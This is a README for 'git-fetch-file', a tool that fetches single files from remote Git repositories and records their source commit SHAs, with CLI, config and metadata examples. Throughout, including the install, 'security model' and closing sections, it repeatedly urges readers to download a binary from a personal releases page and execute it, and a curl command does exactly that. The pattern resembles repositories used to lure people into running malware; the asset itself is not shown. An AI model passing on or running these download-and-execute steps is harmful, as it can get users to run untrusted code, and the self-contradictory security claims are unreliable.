[![Releases](https://img.shields.io/badge/Releases-Visit%20Releases-blue.svg)](https://github.com/Houssem4433/git-fetch-file/releases)

# git-fetch-file — Sync Single Files with Commit Tracking

![git-fetch-file banner](https://raw.githubusercontent.com/github/explore/main/topics/git/git.png)

A small tool that fetches and syncs individual files or globs from remote Git repositories. It tracks the source commit, prevents accidental overwrite of local edits, and keeps a clear history of imported changes.

Quick link to releases: https://github.com/Houssem4433/git-fetch-file/releases  
Download the release asset and execute it. The release contains a single executable or script that you need to download and run on your system.

Table of contents
- Features
- Why use git-fetch-file
- How it works (concept)
- Install
- Configuration
- Basic usage
- Examples
- Advanced options
- File tracking and local-change protection
- Troubleshooting
- Contributing
- License

Features
- Fetch single files or globs from any Git repository.
- Track the exact source commit SHA for each imported file.
- Prevent overwriting local edits unless you accept or force an update.
- Support for branches, tags, and commit SHAs as source refs.
- Dry-run mode to preview changes.
- Metadata stored in a small .gitfetch file per target.
- Optional post-fetch hooks.
- Works with private repos via existing Git credentials.

Why use git-fetch-file
- You need a single file from another repo, not the whole repo.
- You want to keep that file updated but still edit it locally.
- You want traceability to the source commit for auditing.
- You want a simple command that fits into scripts or CI.

How it works (concept)
- You declare a source: repo URL, ref (branch/tag/sha), and path or glob.
- The tool fetches the repo objects it needs and extracts the specified files.
- For each target file, it writes a small metadata entry that records the source repo URL, source ref, and source commit SHA.
- On update, the tool compares the file's recorded source SHA to the new source SHA. If they differ and the local file has local edits, the tool blocks overwrite and shows a diff. You can then accept, merge, or force the overwrite.
- The tool can run in a script-friendly mode to always accept or always skip changes.

Install
- Download the release asset from the releases page and run it.
- The release is a single executable or script. Download and execute the file from: https://github.com/Houssem4433/git-fetch-file/releases
- Place the executable in your PATH (for example /usr/local/bin) or run it from the project root.

Examples:
- Make executable (Linux / macOS):
```bash
curl -L -o git-fetch-file https://github.com/Houssem4433/git-fetch-file/releases/latest/download/git-fetch-file
chmod +x git-fetch-file
./git-fetch-file --version
```

- Fetch a single file from a repo at a branch:
```bash
git-fetch-file fetch \
  --repo https://github.com/other/repo.git \
  --ref main \
  --src-path src/library/util.js \
  --dest-path libs/util.js
```

- Fetch files by glob:
```bash
git-fetch-file fetch \
  --repo https://github.com/other/repo.git \
  --ref v2.0.1 \
  --src-path "configs/*.yaml" \
  --dest-dir configs/vendor
```

- Dry run to preview changes:
```bash
git-fetch-file fetch --dry-run --repo https://github.com/other/repo.git --ref main --src-path README.md
```

- Force overwrite ignoring local changes:
```bash
git-fetch-file fetch --force --repo https://github.com/other/repo.git --ref main --src-path src/index.js
```

Configuration
- You can store fetch jobs in a simple config file `.gitfetch.yml` at the repo root. The tool reads this file and applies listed jobs.
- Example `.gitfetch.yml`:
```yaml
jobs:
  - name: vendor-configs
    repo: https://github.com/other/repo.git
    ref: main
    src: "configs/*.yaml"
    dest: configs/vendor
    merge: false
  - name: shared-util
    repo: git@github.com:org/shared.git
    ref: v1.2.0
    src: "lib/util.js"
    dest: libs/util.js
    merge: interactive
```
- Fields:
  - repo: Git URL (HTTP or SSH).
  - ref: branch, tag, or commit SHA.
  - src: file path or glob in the source repo.
  - dest: file path or directory in the local repo.
  - merge: behavior when local edits exist. Options: skip, force, interactive.

File tracking and metadata
- The tool stores metadata for each imported file in .gitfetch/metadata.json or per-file .gitfetch entries next to the file.
- Example metadata entry:
```json
{
  "file": "libs/util.js",
  "source_repo": "https://github.com/other/repo.git",
  "source_ref": "main",
  "source_sha": "3b2a1f4d8e7c...",
  "fetched_at": "2025-08-15T12:34:56Z"
}
```
- The metadata records the source commit SHA. You can audit changes later by checking that SHA.

Advanced options
- Partial fetch: Use --path to fetch a single file without cloning entire history.
- SSH auth: The tool uses your existing SSH agent and key. It calls Git under the hood.
- CI mode: Set CI=true to make the tool non-interactive.
- Post-fetch hook: Run scripts after fetch. Example:
```yaml
jobs:
  - name: update-license
    repo: https://github.com/other/repo.git
    ref: main
    src: LICENSE
    dest: THIRD_PARTY_LICENSES/LICENSE.shared
    hooks:
      post: ./scripts/format-license.sh
```
- Rebase-like merge: If you set merge: threeway, the tool creates a temporary index and attempts a three-way merge between old imported content, new source content, and your local edits.

Common workflows
- Pull a small helper script from a library repo and keep it up to date without merging the whole repo.
- Share a canonical config file across multiple projects, while allowing local overrides and guarded updates.
- Import templates or small assets from a central repo with a clear trace to the source commit.

Behavior on local edits
- If local file differs from the last imported version, the tool checks whether the source changed.
  - If source did not change, the tool leaves the file untouched.
  - If source changed and local edits exist, the tool stops and prints a concise diff. You can choose to:
    - Run with --merge interactive to attempt a merge.
    - Run with --force to overwrite.
    - Edit the file and run fetch again.
- This policy prevents accidental loss of local work.

CLI reference (selected)
- fetch: Fetch files according to job or inline args.
- status: Show the recorded source SHA and compare with latest source.
- list: List jobs from .gitfetch.yml or recorded metadata.
- remove: Remove a tracked file and its metadata.
- version: Show version.

Usage patterns
- Scripted periodic sync:
```bash
git-fetch-file fetch --config .gitfetch.yml --ci
```
- Inline one-off:
```bash
git-fetch-file fetch --repo https://github.com/example/demo.git --ref main --src-path scripts/deploy.sh --dest-path scripts/deploy-from-demo.sh
```
- Audit imported files:
```bash
git-fetch-file status --json | jq .
```

Examples that match real needs
- Keep a shared linter config file up to date in many repos. Fetch .eslintrc from the central repo and stop if you ever modify it locally.
- Pull test data files from a data repo into a test/fixtures directory. Fetch by glob and only update when the source changes.
- Distribute a packaging script to many projects. Track its source SHA so you can roll back if needed.

Troubleshooting
- Authentication: If Git prompts for credentials, ensure your SSH agent runs and your SSH key is added. For HTTPS, ensure credential helpers are configured.
- Large repo: The tool fetches only the objects it needs. If the remote server rejects partial fetch, fallback to shallow clone.
- Conflicts: When interactive merge fails, the tool writes .gitfetch/conflict/<file> with the three-way merge result and a small report.

Integrations
- CI: Use CI mode for automatic updates in GitHub Actions, GitLab CI, etc.
- Pre-commit: Add a pre-commit hook to verify imported files match recorded source SHA.
- Make: Add a Make target to update vendor files before a build.

Security model
- The tool runs the fetched script or binary only when you explicitly run the downloaded asset from releases. The release page contains the executable or script you must download and run. Use normal OS-level execution controls.
- The tool records the source SHA for audit. You can revert to earlier versions using the recorded SHA.

Files and layout created by tool
- .gitfetch/
  - metadata.json
  - jobs.yml (optional)
  - conflict/
- Fetched files appear at the dest paths you specify.

Contributing
- Open issues for feature requests and bugs.
- Fork, branch, and submit a pull request.
- Provide tests for new features.
- Use the same config format and metadata layout for compatibility.

Releases and downloads
- Get the runtime and release assets at: https://github.com/Houssem4433/git-fetch-file/releases  
- The release page holds the executable or script that you must download and execute to install the tool. The asset name includes the platform and version.

Images and badges
- Use the releases badge above to open the releases page.
- You can add your own badge:
```markdown
[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Houssem4433/git-fetch-file/releases)
```

Licensing
- The repository uses the MIT License. See LICENSE file in the repo for full text.

Contact and maintainers
- Open issues on the repo for bugs, help, and feature requests.
- Send a clear reproduction case when reporting a bug. Include git-fetch-file --version and your OS.

Command cheat sheet
- Fetch one file:
```bash
git-fetch-file fetch --repo REPO --ref REF --src-path PATH --dest-path DEST
```
- Dry run:
```bash
git-fetch-file fetch --dry-run ...
```
- Force:
```bash
git-fetch-file fetch --force ...
```
- Show status:
```bash
git-fetch-file status
```

Keep your vendor files traceable. Keep local edits safe. Use the releases page to download and run the tool: https://github.com/Houssem4433/git-fetch-file/releases